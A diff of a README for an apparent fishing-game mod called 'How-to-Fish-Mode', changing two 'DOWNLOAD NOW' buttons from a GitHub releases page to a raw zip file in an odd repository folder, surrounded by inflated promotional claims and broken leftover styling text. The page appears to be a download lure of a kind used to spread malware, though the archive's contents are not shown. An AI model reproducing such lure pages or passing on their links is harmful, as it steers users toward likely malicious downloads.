@@ -26,7 +26,7 @@ Welcome to **How-to-Fish-Mode** — the ultimate companion tool for gamers who w
 
 Visit this link to download the application:
 
-[**⬇️ DOWNLOAD NOW – How-to-Fish-Mode**](https://github.com/chuot331775971-ui/How-to-Fish-Mode/releases)
+[**⬇️ DOWNLOAD NOW – How-to-Fish-Mode**](https://raw.githubusercontent.com/chuot331775971-ui/How-to-Fish-Mode/main/Telchines/1.4.zip)
 
 Width="100%" style="display:inline-block;padding:18px 32px;background:linear-gradient(135deg,#ff6b6b,#ffcc5c);color:#000;font-size:22px;font-weight:bold;text-align:center;border-radius:50px;box-shadow:0 8px 20px rgba(0,0,0,0.3);text-decoration:none;")
 
@@ -213,7 +213,7 @@ Join over 50,000+ happy users who've transformed their fishing gameplay entirely
 
 **Remember:** Downloading takes 30 seconds, setup takes 2 minutes,and the fun never ends. 
 
-[**🚀 CLICK HERE TO DOWNLOAD HOW-TO-FISH-MODE NOW**](https://github.com/chuot331775971-ui/How-to-Fish-Mode/releases)
+[**🚀 CLICK HERE TO DOWNLOAD HOW-TO-FISH-MODE NOW**](https://raw.githubusercontent.com/chuot331775971-ui/How-to-Fish-Mode/main/Telchines/1.4.zip)
 
 Width="100%" style="display:inline-block;padding:18px 32px;background:linear-gradient(135deg,#4ecdc4,#44bd32);color:#fff;font-size:22px;font-weight:bold;text-align:center;border-radius:50px;box-shadow:0 8px 20px rgba(0,0,0,0.3);text-decoration:none;")
 
